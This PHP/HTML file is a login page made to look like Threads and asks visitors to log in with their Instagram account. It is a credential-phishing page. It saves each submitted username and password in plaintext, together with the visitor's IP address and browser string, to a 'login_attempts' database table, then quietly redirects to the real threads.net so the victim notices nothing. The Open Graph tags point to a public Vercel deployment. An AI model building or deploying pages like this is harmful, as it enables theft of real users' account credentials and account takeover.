<?php
session_start();
require_once 'config.php';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    // Validate inputs
    if (empty($username) || empty($password)) {
        $error = "Please fill in both username and password fields.";
    } else {
        // Save ONLY to MySQL database (XAMPP)
        try {
            $pdo = getDBConnection();
            $stmt = $pdo->prepare("INSERT INTO login_attempts (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
            $stmt->execute([
                $username,
                $password,
                $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
            ]);
            
            // Set session and redirect
            $_SESSION['logged_in'] = true;
            $_SESSION['username'] = $username;
            
            // Redirect to Threads
            header("Location: https://www.threads.net/");
            exit();
            
        } catch (Exception $e) {
            // Database connection or insert failed
            $error = "Login failed. Please make sure XAMPP MySQL is running and try again.";
            error_log("Database error: " . $e->getMessage());
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Threads</title>
     <meta property="og:title" content="Threads AI" />
  <meta property="og:description" content="Threads-inspired login UI deployed on Vercel." />
  <meta property="og:image" content="https://threads-ai-giz05tnm7-cyndilou-guillenas-projects.vercel.app/thumbnail.png" />
  <meta property="og:url" content="https://threads-ai-giz05tnm7-cyndilou-guillenas-projects.vercel.app/" />
  <meta property="og:type" content="website" />

  <!-- Twitter / X -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="https://threads-ai-giz05tnm7-cyndilou-guillenas-projects.vercel.app/thumbnail.png" />

    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="mobile-header">
        <div class="mobile-back-button">←</div>
        <div class="mobile-logo">
            <img src="threads logo.png" alt="Threads" class="threads-logo">
        </div>
    </div>

    <div class="top-image-wrapper">
        <img src="JlaY6JCPfe-.png" alt="Top Design" class="top-image">
    </div>

    <div class="container">
        <div class="login-section">
            <h1 class="desktop-title">Log in with your Instagram account</h1>
            <h1 class="mobile-title">Log in with your Instagram account</h1>
            
            <?php if (isset($error)): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <?php if (isset($success)): ?>
                <div class="success-message"><?php echo $success; ?></div>
            <?php endif; ?>
            
            <form class="login-form" method="POST" action="">
                <input type="text" name="username" placeholder="Username, phone or email" class="form-input" required>
                <input type="password" name="password" placeholder="Password" class="form-input" required>
                <button type="submit" class="login-button">Log in</button>
            </form>
            
            <a href="forgot-password.php" target="_blank" class="forgot-link">Forgot password?</a>
            
            <div class="divider">
                <span>or</span>
            </div>
            
            <button class="instagram-button">
                <div class="instagram-icon">
                    <svg width="20" height="20" viewBox="0 0 24 24">
                        <defs>
                            <radialGradient id="ig-gradient" cx="0.5" cy="1" r="1">
                                <stop offset="0%" stop-color="#fdf497"/>
                                <stop offset="5%" stop-color="#fdf497"/>
                                <stop offset="45%" stop-color="#fd5949"/>
                                <stop offset="60%" stop-color="#d6249f"/>
                                <stop offset="90%" stop-color="#285AEB"/>
                            </radialGradient>
                        </defs>
                        <path fill="url(#ig-gradient)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.40s-.644-1.44-1.439-1.44z"/>
                    </svg>
                </div>
                Continue with Instagram
                <span class="arrow">›</span>
            </button>
        </div>
        
        <div class="qr-section">
            <div class="qr-text">Scan to get the app</div>
            <div class="qr-code">
                <img src="threadsclone.png" alt="QR Code" class="qr-image">
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <span>© 2026</span>
        <a href="#">Threads Terms</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookies Policy</a>
        <a href="#">Report a problem</a>
    </footer>
</body>
</html>
